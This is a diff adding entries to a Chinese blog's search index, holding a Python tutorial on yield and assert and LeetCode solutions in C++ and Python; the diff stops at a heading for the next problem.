@@ -1,6 +1,283 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Git</title>
+    <url>/2025/04/25/Git/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Python 基础</title>
+    <url>/2025/02/04/Python-%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1>关键字</h1>
+<h2 id="yield">yield</h2>
+<p><code>yield</code> 是 Python 中的一个关键字，用于定义生成器函数（generator function）。生成器函数是一种特殊的函数，它可以逐步产生值，而不是一次性返回所有结果。<code>yield</code> 的作用是将函数变成一个生成器，每次调用生成器的 <code>__next__()</code> 方法时，函数会执行到 <code>yield</code> 语句并返回一个值，然后暂停执行，直到下一次调用。</p>
+<hr>
+<h3 id="yield-的基本用法"><strong>yield 的基本用法</strong></h3>
+<h4 id="示例-1：简单的生成器函数">示例 1：简单的生成器函数</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = simple_generator()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 3</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>每次调用 <code>next(gen)</code>，函数会从上次暂停的地方继续执行，直到遇到下一个 <code>yield</code>。</li>
+<li>当没有更多的值可以生成时，会抛出 <code>StopIteration</code> 异常。</li>
+</ul>
+<hr>
+<h4 id="示例-2：使用-for-循环遍历生成器">示例 2：使用 for 循环遍历生成器</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 for 循环遍历生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> simple_generator():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>for</code> 循环会自动处理 <code>StopIteration</code> 异常，因此不需要手动调用 <code>next()</code>。</li>
+</ul>
+<hr>
+<h3 id="yield-的优势"><strong>yield 的优势</strong></h3>
+<ol>
+<li>
+<p><strong>惰性求值</strong>：</p>
+<ul>
+<li>生成器不会一次性生成所有值，而是按需生成，节省内存。</li>
+<li>适合处理大量数据或无限序列。</li>
+</ul>
+</li>
+<li>
+<p><strong>代码简洁</strong>：</p>
+<ul>
+<li>使用 <code>yield</code> 可以避免手动实现迭代器协议（<code>__iter__</code> 和 <code>__next__</code>）。</li>
+</ul>
+</li>
+<li>
+<p><strong>状态保持</strong>：</p>
+<ul>
+<li>生成器函数会记住上次执行的状态，下次调用时从上次暂停的地方继续。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="yield-的高级用法"><strong>yield 的高级用法</strong></h3>
+<h4 id="示例-3：生成无限序列">示例 3：生成无限序列</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">infinite_sequence</span>():</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = infinite_sequence()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="comment"># 可以无限调用 next(gen)</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>这个生成器会无限生成递增的整数。</li>
+</ul>
+<hr>
+<h4 id="示例-4：使用-yield-实现斐波那契数列">示例 4：使用 <code>yield</code> 实现斐波那契数列</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>():</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = fibonacci()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">8</span><br><span class="line">13</span><br><span class="line">21</span><br><span class="line">34</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这个生成器会无限生成斐波那契数列的值。</li>
+</ul>
+<hr>
+<h4 id="示例-5：yield-from（委托生成器）">示例 5：<code>yield from</code>（委托生成器）</h4>
+<p><code>yield from</code> 用于将生成器的控制权委托给另一个生成器。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;Start&#x27;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> sub_generator()</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;End&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> main_generator():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">End</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>yield from</code> 可以简化生成器的嵌套调用。</li>
+</ul>
+<hr>
+<h3 id="yield-与-return-的区别"><strong>yield 与 return 的区别</strong></h3>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th><code>yield</code></th>
+<th><code>return</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>返回值</td>
+<td>每次生成一个值，函数暂停</td>
+<td>返回一个值，函数结束</td>
+</tr>
+<tr>
+<td>状态保持</td>
+<td>函数状态会被保存</td>
+<td>函数状态不会被保存</td>
+</tr>
+<tr>
+<td>适用场景</td>
+<td>生成器函数</td>
+<td>普通函数</td>
+</tr>
+<tr>
+<td>内存占用</td>
+<td>惰性求值，节省内存</td>
+<td>一次性返回所有结果，占用内存</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="总结"><strong>总结</strong></h3>
+<ul>
+<li><code>yield</code> 是 Python 中实现生成器的关键，适合处理大量数据或需要惰性求值的场景。</li>
+<li>生成器函数通过 <code>yield</code> 逐步返回值，并保持函数状态，直到生成所有值。</li>
+<li><code>yield from</code> 可以简化生成器的嵌套调用。</li>
+</ul>
+<h2 id="assert">assert</h2>
+<p><code>assert</code> 是 Python 中的一个关键字，用于调试和测试代码。它的作用是检查某个条件是否为真，如果条件为假，则会触发 <code>AssertionError</code> 异常。<code>assert</code> 通常用于确保程序在某个关键点的状态符合预期，如果不符合，则立即停止程序并抛出错误。</p>
+<hr>
+<h3 id="assert-的基本语法"><strong>assert 的基本语法</strong></h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> condition, message</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><code>condition</code></strong>：需要检查的条件表达式。如果为 <code>True</code>，程序继续执行；如果为 <code>False</code>，则抛出 <code>AssertionError</code>。</li>
+<li><strong><code>message</code></strong>（可选）：当条件为 <code>False</code> 时，抛出的异常信息。如果未提供，则使用默认的 <code>AssertionError</code>。</li>
+</ul>
+<hr>
+<h3 id="assert-的作用"><strong>assert 的作用</strong></h3>
+<ol>
+<li>
+<p><strong>调试工具</strong>：</p>
+<ul>
+<li>用于在开发阶段检查代码逻辑是否正确。</li>
+<li>如果条件不满足，程序会立即停止，方便定位问题。</li>
+</ul>
+</li>
+<li>
+<p><strong>测试工具</strong>：</p>
+<ul>
+<li>在单元测试中，用于验证函数的输出是否符合预期。</li>
+</ul>
+</li>
+<li>
+<p><strong>文档工具</strong>：</p>
+<ul>
+<li>通过 <code>assert</code> 可以清晰地表达代码的预期行为。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="assert-的示例"><strong>assert 的示例</strong></h3>
+<h4 id="示例-1：简单的-assert-用法">示例 1：简单的 assert 用法</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="keyword">assert</span> x == <span class="number">10</span>, <span class="string">&quot;x 应该等于 10&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果 <code>x == 10</code> 为 <code>True</code>，程序继续执行。</li>
+<li>如果 <code>x == 10</code> 为 <code>False</code>，则抛出 <code>AssertionError</code>，并显示消息 <code>&quot;x 应该等于 10&quot;</code>。</li>
+</ul>
+<hr>
+<h4 id="示例-2：检查函数返回值">示例 2：检查函数返回值</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">assert</span> b != <span class="number">0</span>, <span class="string">&quot;除数不能为 0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> a / b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>, <span class="number">2</span>))  <span class="comment"># 输出: 5.0</span></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>, <span class="number">0</span>))  <span class="comment"># 触发 AssertionError: 除数不能为 0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>在函数中使用 <code>assert</code> 可以确保输入参数的有效性。</li>
+</ul>
+<hr>
+<h4 id="示例-3：检查列表是否非空">示例 3：检查列表是否非空</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_list</span>(<span class="params">items</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(items) &gt; <span class="number">0</span>, <span class="string">&quot;列表不能为空&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line">process_list([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment"># 正常执行</span></span><br><span class="line">process_list([])         <span class="comment"># 触发 AssertionError: 列表不能为空</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="assert-的注意事项"><strong>assert 的注意事项</strong></h3>
+<ol>
+<li>
+<p><strong>不要用于数据验证</strong>：</p>
+<ul>
+<li><code>assert</code> 主要用于调试和测试，不应该用于检查用户输入或外部数据。</li>
+<li>因为 Python 可以通过 <code>-O</code>（优化模式）运行，此时所有的 <code>assert</code> 语句会被忽略。</li>
+</ul>
+</li>
+<li>
+<p><strong>避免副作用</strong>：</p>
+<ul>
+<li><code>assert</code> 的条件表达式不应该包含有副作用的操作（如修改全局变量、调用函数等），因为在优化模式下这些操作会被跳过。</li>
+</ul>
+</li>
+<li>
+<p><strong>替代方案</strong>：</p>
+<ul>
+<li>对于数据验证或输入检查，应该使用 <code>if</code> 语句并手动抛出异常（如 <code>ValueError</code>、<code>TypeError</code> 等）。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="assert-与-if-的区别"><strong>assert 与 if 的区别</strong></h3>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th><code>assert</code></th>
+<th><code>if</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>用途</td>
+<td>调试和测试</td>
+<td>通用条件判断</td>
+</tr>
+<tr>
+<td>触发异常</td>
+<td>触发 <code>AssertionError</code></td>
+<td>需要手动抛出异常</td>
+</tr>
+<tr>
+<td>优化模式</td>
+<td>在 <code>-O</code> 模式下会被忽略</td>
+<td>不受影响</td>
+</tr>
+<tr>
+<td>适用场景</td>
+<td>检查内部逻辑是否正确</td>
+<td>检查用户输入或外部数据</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="assert-的优化模式"><strong>assert 的优化模式</strong></h3>
+<p>Python 支持以优化模式运行脚本，此时所有的 <code>assert</code> 语句会被忽略。可以通过以下命令启用优化模式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -O script.py</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在优化模式下，<code>assert</code> 语句不会被执行，因此不能依赖它来实现关键逻辑。</li>
+</ul>
+<hr>
+<h3 id="总结-2"><strong>总结</strong></h3>
+<ul>
+<li><code>assert</code> 是一个强大的调试工具，用于检查代码逻辑是否符合预期。</li>
+<li>它适合在开发和测试阶段使用，但不适合用于生产环境中的数据验证。</li>
+<li>如果需要更健壮的输入检查，应该使用 <code>if</code> 语句并手动抛出异常。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode</title>
+    <url>/2025/03/17/leetcode/</url>
+    <content><![CDATA[<h1>哈希</h1>
+<h2 id="1-两数之和">1.两数之和</h2>
+<p>快速查找需求</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums,<span class="type">int</span> target)</span></span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; hashtable;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = hashtable.<span class="built_in">find</span>(target-nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(it !=hashtable.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;i,it-&gt;second&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable[nums[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable=&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> target-nums[i] <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [i,hashtable[target-nums[i]]]</span><br><span class="line">            hashtable[nums[i]] =i</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>
+<h2 id="面试题-16-15-珠玑妙算">面试题 16.15 珠玑妙算</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">masterMind</span><span class="params">(string solution, string guess)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ri= <span class="number">0</span>,fr=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> dic[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; char_to_index = &#123;&#123;<span class="string">&#x27;R&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;Y&#x27;</span>,<span class="number">1</span>&#125;,&#123;<span class="string">&#x27;G&#x27;</span>,<span class="number">2</span>&#125;,&#123;<span class="string">&#x27;B&#x27;</span>,<span class="number">3</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="type">char</span> s=solution[i],g = guess[i];</span><br><span class="line">            <span class="keyword">if</span>(s==g)</span><br><span class="line">                ri++;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dic[char_to_index[s]][<span class="number">0</span>]++;</span><br><span class="line">                dic[char_to_index[g]][<span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">            fr+=<span class="built_in">min</span>(dic[i][<span class="number">0</span>],dic[i][<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> &#123;ri,fr&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 低效</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">masterMind</span>(<span class="params">self, solution: <span class="built_in">str</span>, guess: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hash_sol,hash_gue = defaultdict(<span class="built_in">int</span>),defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        right,fr=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> solution[i]==guess[i]:</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hash_gue[guess[i]]+=<span class="number">1</span></span><br><span class="line">                hash_sol[solution[i]]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> hash_gue:</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> hash_sol:</span><br><span class="line">                fr += <span class="built_in">min</span> (hash_sol[key],hash_gue[key])</span><br><span class="line">        <span class="keyword">return</span> [right,fr]</span><br><span class="line"><span class="comment"># 优化</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">masterMind</span>(<span class="params">self, solution: <span class="built_in">str</span>, guess: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># 初始化猜中次数和伪猜中次数</span></span><br><span class="line">        corr, err = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用列表代替字典，索引对应字符：</span></span><br><span class="line">        <span class="comment"># 0: &#x27;R&#x27;, 1: &#x27;Y&#x27;, 2: &#x27;G&#x27;, 3: &#x27;B&#x27;</span></span><br><span class="line">        <span class="comment"># dic[char][0]: solution 中未匹配的字符数量</span></span><br><span class="line">        <span class="comment"># dic[char][1]: guess 中未匹配的字符数量</span></span><br><span class="line">        dic = [[<span class="number">0</span>, <span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 字符到索引的映射</span></span><br><span class="line">        char_to_index = &#123;<span class="string">&#x27;R&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;Y&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;G&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历字符串，统计猜中次数和未匹配字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s, g = solution[i], guess[i]</span><br><span class="line">            <span class="keyword">if</span> s == g:</span><br><span class="line">                corr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 更新 solution 中未匹配字符的数量</span></span><br><span class="line">                dic[char_to_index[s]][<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">                <span class="comment"># 更新 guess 中未匹配字符的数量</span></span><br><span class="line">                dic[char_to_index[g]][<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算伪猜中次数</span></span><br><span class="line">        <span class="keyword">for</span> count_sol, count_gue <span class="keyword">in</span> dic:</span><br><span class="line">            err += <span class="built_in">min</span>(count_sol, count_gue)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [corr, err]</span><br></pre></td></tr></table></figure>
+<h2 id="1941-检查是否所有字符出现次数相同">1941 检查是否所有字符出现次数相同</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">areOccurrencesEqual</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span> ,<span class="type">int</span>&gt; hashtable;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :s)</span><br><span class="line">            hashtable[c]++;</span><br><span class="line">        <span class="type">int</span> n = hashtable[s[<span class="number">0</span>]];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c :s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hashtable[c]!=n)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">areOccurrencesEqual</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        hashtable = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            hashtable[i]+=<span class="number">1</span></span><br><span class="line">        n = hashtable[s[<span class="number">0</span>]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hashtable:</span><br><span class="line">            <span class="keyword">if</span> n!=hashtable[i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="comment"># 优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">areOccurrencesEqual</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        c = Counter(s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">set</span>(c.values())) == <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 id="13-罗马数字转整数">13 罗马数字转整数</h2>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map &lt;<span class="type">char</span>,<span class="type">int</span>&gt; dic = &#123;&#123;<span class="string">&#x27;I&#x27;</span>,<span class="number">1</span>&#125;,&#123;<span class="string">&#x27;V&#x27;</span>,<span class="number">5</span>&#125;,&#123;<span class="string">&#x27;X&#x27;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&#x27;L&#x27;</span>,<span class="number">50</span>&#125;,&#123;<span class="string">&#x27;C&#x27;</span>,<span class="number">100</span>&#125;,&#123;<span class="string">&#x27;D&#x27;</span>,<span class="number">500</span>&#125;,&#123;<span class="string">&#x27;M&#x27;</span>,<span class="number">1000</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        // 使用数组代替 unordered_map更快</span></span><br><span class="line"><span class="comment">        int dic[256] = &#123;0&#125;; // ASCII 表大小为 256</span></span><br><span class="line"><span class="comment">        dic[&#x27;I&#x27;] = 1;</span></span><br><span class="line"><span class="comment">        dic[&#x27;V&#x27;] = 5;</span></span><br><span class="line"><span class="comment">        dic[&#x27;X&#x27;] = 10;</span></span><br><span class="line"><span class="comment">        dic[&#x27;L&#x27;] = 50;</span></span><br><span class="line"><span class="comment">        dic[&#x27;C&#x27;] = 100;</span></span><br><span class="line"><span class="comment">        dic[&#x27;D&#x27;] = 500;</span></span><br><span class="line"><span class="comment">        dic[&#x27;M&#x27;] = 1000;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=s.<span class="built_in">length</span>()<span class="number">-1</span> &amp;&amp; dic[s[i]]&lt;dic[s[i<span class="number">+1</span>]])</span><br><span class="line">                result-=dic[s[i]];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                result+=dic[s[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">romanToInt</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dic = &#123;<span class="string">&quot;I&quot;</span>:<span class="number">1</span>,<span class="string">&quot;V&quot;</span>:<span class="number">5</span>,<span class="string">&quot;X&quot;</span>:<span class="number">10</span>,<span class="string">&quot;L&quot;</span>:<span class="number">50</span>,<span class="string">&quot;C&quot;</span>:<span class="number">100</span>,<span class="string">&quot;D&quot;</span>:<span class="number">500</span>,<span class="string">&quot;M&quot;</span>:<span class="number">1000</span>&#125;</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> i !=<span class="built_in">len</span>(s)-<span class="number">1</span> <span class="keyword">and</span> dic[s[i]] &lt; dic[s[i+<span class="number">1</span>]]  :</span><br><span class="line">                result -= dic[s[i]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += dic[s[i]]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+<h2 id="3-无重复字符的最长子串">3.无重复字符的最长子串</h2>
